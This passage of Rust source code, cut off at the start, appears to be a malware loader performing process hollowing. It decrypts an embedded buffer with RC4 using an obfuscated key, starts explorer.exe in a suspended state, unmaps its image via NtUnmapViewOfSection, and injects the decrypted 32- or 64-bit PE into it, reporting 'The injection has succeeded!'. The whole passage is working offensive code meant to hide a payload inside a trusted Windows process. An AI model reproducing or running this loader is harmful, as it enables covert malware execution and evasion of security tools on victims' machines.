        0x55,0x6d,0x63,0x23,0x21,0x7b,0x58,0x79,0x21,0x70,0x79,0x63,0x41,0x7f,0x76,0x73,0x69,0x64,
        0x3e,0x63,0x74,0x72,0x3c,0x7c,0x65,0x6e,0x1a,0x7e,0x64,0x7c,
    ];
    let mut j = 1;
    for i in 0..30 {
        if i % 2 == 0 {
            key[i] = key[i] + j;
        } else {
            j = j + 1;
        }
        key[i] = key[i] ^ 0x17;
    }

    // Decrypt the buffer
    let mut rc4 = Rc4::new(&key);
    rc4.apply_keystream(&mut lpbuffer);
    
    // Copy decrypted into allocated memory
    ptr::copy_nonoverlapping(
        lpbuffer.as_ptr(),
        buffer as *mut u8,
        lpbuffer.len()
    );

    let mut source32=0;
    let source_magic = get_pe_magic(buffer as *const u8)?;
    if source_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        source32 = 1;
    }
    let process_name = if source_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
        CString::new("C:\\Windows\\SysWOW64\\explorer.exe").unwrap()
    } else {
        CString::new("C:\\Windows\\explorer.exe").unwrap()
    };
    
    let mut startup_info: winapi::um::processthreadsapi::STARTUPINFOA = unsafe { mem::zeroed() };
    startup_info.cb = mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOA>() as u32;

    let mut process_info: winapi::um::processthreadsapi::PROCESS_INFORMATION = unsafe { mem::zeroed() };

    let success = unsafe {
        winapi::um::processthreadsapi::CreateProcessA(
            process_name.as_ptr(),  
            ptr::null_mut(),       
            ptr::null_mut(),       
            ptr::null_mut(),       
            true as i32,                      
            winapi::um::winbase::CREATE_SUSPENDED,
            ptr::null_mut(),        
            ptr::null_mut(),       
            &mut startup_info,      
            &mut process_info      
        )
    };

    if success == 0 {
        return Err(io::Error::last_os_error());
    }
    
    if source32 == 1 {
        println!("[+] Source is 32-bit PE");
        match get_process_address_information32(&process_info) {
            Some(info) => {
                if info.peb_address.is_null() || info.image_base_address.is_null() {
                    println!("[-] Failed to get process address information");
                    unsafe {
                        TerminateProcess(process_info.hProcess, 1);
                        VirtualFree(buffer, 0, MEM_RELEASE);
                    }
                    return Ok(());
                }
                if let Some(peb) = read_remote_peb(process_info.hProcess) {
                    println!("Successfully read process PEB");
                    println!("Image base address: {:p}", peb.image_base_address);
                    
                    let loaded_image = match read_remote_image32(process_info.hProcess, peb.image_base_address) {
                        Some(image) => {
                            println!("Successfully read remote image");
                            println!("Number of sections: {}", image.number_of_sections);
                            image
                        }
                        None => {
                            println!("Failed to read remote image");
                            return Ok(());
                        }
                    };
                }
                let has_reloc = has_relocation32(buffer as *const u8);

                if has_reloc{
                    println!("[+] The source image has a relocation table");
                    if run_pereloc32(&process_info, buffer as *const u8) {
                        println!("[+] The injection has succeeded!");
                        unsafe {
                            CloseHandle(process_info.hProcess);
                            CloseHandle(process_info.hThread);
                            VirtualFree(buffer, 0, MEM_RELEASE);
                        }
                        return Ok(());
                    }
                }
                else {
                    println!("[+] The source image doesn't have a relocation table");
                    if run_pe32(&process_info, buffer as *const u8) {
                        println!("[+] The injection has succeeded!");
                        unsafe {
                            CloseHandle(process_info.hProcess);
                            CloseHandle(process_info.hThread);
                            VirtualFree(buffer, 0, MEM_RELEASE);
                        }
                        return Ok(());
                    }
                }  
            }
            None => {
                println!("[-] Failed to get WOW64 context");
                unsafe {
                    TerminateProcess(process_info.hProcess, 1);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }
        }
    }
    else {
        println!("64 BIT");
        let mut input = String::new();
        io::stdin().read_line(&mut input).unwrap();

        // Read target process PEB
        if let Some(peb) = read_remote_peb(process_info.hProcess) {
            println!("Successfully read process PEB");
            println!("Image base address: {:p}", peb.image_base_address);
            println!("PEB address {:p}", peb);

            let loaded_image = match read_remote_image(process_info.hProcess, peb.image_base_address) {
                Some(image) => {
                    println!("Successfully read remote image");
                    println!("Number of sections: {}", image.number_of_sections);
                    image
                }
                None => {
                    println!("Failed to read remote image");
                    return Ok(());
                }
            };

            let source_magic = get_pe_magic(buffer as *const u8)?;
            if source_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
                println!("Source PE is not 64-bit (Magic: 0x{:X})", source_magic);
                unsafe { VirtualFree(buffer, 0, MEM_RELEASE) };
                return Ok(());
            }

            let target_magic = read_remote_pe_magic(process_info.hProcess, peb.image_base_address)?;
            if target_magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
                println!("Target process is not 64-bit (Magic: 0x{:X})", target_magic);
                unsafe {
                    winapi::um::processthreadsapi::TerminateProcess(process_info.hProcess, 1);
                    VirtualFree(buffer, 0, MEM_RELEASE);
                }
                return Ok(());
            }

            println!("Both source and target are 64-bit PE files");

            let nt_unmap_view_of_section = match get_nt_unmap_view_of_section() {
                Some(func) => func,
                None => {
                    println!("Failed to get NtUnmapViewOfSection function");
                    return Ok(());
                }
            };

            // Unmap the section
            let result = unsafe {
                nt_unmap_view_of_section(
                    process_info.hProcess,
                    peb.image_base_address
                )
            };

            if result != 0 {
                println!("Error unmapping section: {}", result);
                return Ok(());
            }

            println!("Successfully unmapped section");

            let has_reloc = has_relocation64(buffer as *const u8);
            if !has_reloc {
                println!("[+] The source image doesn't have a relocation table.");
                if run_pe64(&process_info, buffer as *const u8) {
                    println!("[+] The injection has succeeded!");
                    // Clean up process
                    unsafe {
                        CloseHandle(process_info.hProcess);
                        CloseHandle(process_info.hThread);
                        VirtualFree(buffer, 0, MEM_RELEASE);
                    }
                    return Ok(());
                } 
            }   
            else {
                println!("[+] The source image has a relocation table.");
                if run_pe_reloc64(&process_info, buffer as *const u8) {
                    println!("[+] The injection has succeeded!");
                    unsafe {
                        CloseHandle(process_info.hProcess);
                        CloseHandle(process_info.hThread);
                        VirtualFree(buffer, 0, MEM_RELEASE);
                    }
                    return Ok(());
                }
            }
        } 
        else {
            println!("Failed to read process PEB");
        }
    }
    Ok(())
} 
